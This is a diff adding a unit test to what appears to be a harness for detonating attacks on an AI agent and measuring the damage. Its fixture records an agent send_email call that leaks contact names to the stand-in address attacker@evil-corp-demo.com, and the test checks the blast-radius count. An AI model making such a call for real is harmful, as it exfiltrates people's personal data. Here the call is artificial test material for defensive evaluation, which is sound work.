@@ -81,3 +81,19 @@ def test_clean_run_passes():
     assert not verdict.confirmed and verdict.policies_violated == []
     assert result.passed and result.legit_task_completed == "1/1"
     assert [e.tool for e in result.effects] == ["read_calendar", "send_email"]
+
+
+def test_blast_radius_counts_contacts_leaked_by_name():
+    contacts = [{"name": f"Person {i}", "company": "Contoso"} for i in range(1, 6)]
+    run = SimpleNamespace(
+        id="run_1", agent="assistant", task="t", system="", model_id="", entrypoint="x:y",
+        legit={}, model_calls=[], tool_results=[
+            {"call_id": "c1", "tool": "search_contacts", "args": {"query": ""},
+             "result": contacts, "error": None}])
+    snap = snapshot.save(run, "inc_002", POLICY)
+    bad = [sandbox.Effect(detonation_id="d", run_index=1, step=1, tool="send_email",
+                          args={"to": "attacker@evil-corp-demo.com",
+                                "body": "Person 1, Person 2, Person 3 (Contoso)"},
+                          violates=["P1"])]
+    radius = sandbox.blast_radius(snap, bad, 1, 1)
+    assert radius.records == 3 and radius.recipients == ["attacker@evil-corp-demo.com"]
